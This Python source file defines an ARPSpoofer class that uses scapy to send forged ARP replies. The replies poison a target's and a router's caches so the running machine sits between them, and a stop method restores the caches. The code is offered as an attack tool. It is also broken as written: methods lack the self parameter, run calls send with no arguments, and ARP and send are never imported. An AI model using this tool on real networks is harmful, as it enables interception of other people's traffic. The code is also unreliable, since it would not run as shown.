import os
import scapy.all as scapy
from time import sleep
from ..utils import get_mac, get_router_ip


class ARPSpoofer():
    def __init__(self, target_ip, interface="wlan0", router_ip=get_router_ip()):
        self.target_ip = target_ip
        self.router_ip = router_ip
        self.target_mac = get_mac(self.target_ip, interface)
        self.router_mac = get_mac(self.router_ip, interface)

    def run(self, on_packet_callback, verbose=True):
        send()

    def trick():
        send(ARP(op=2, pdst=self.target_ip,
             psrc=self.router_ip, hwdst=self.target_mac))
        send(ARP(op=2, pdst=self.router_ip,
             psrc=self.target_ip, hwdst=self.router_mac))

    def stop(verbose=True):
        if verbose:
            print("Restoring targets")
        send(ARP(op=2, pdst=self.router_ip, psrc=self.target_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac), count=7)
        send(ARP(op=2, pdst=self.target_ip, psrc=self.router_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.router_mac), count=7)
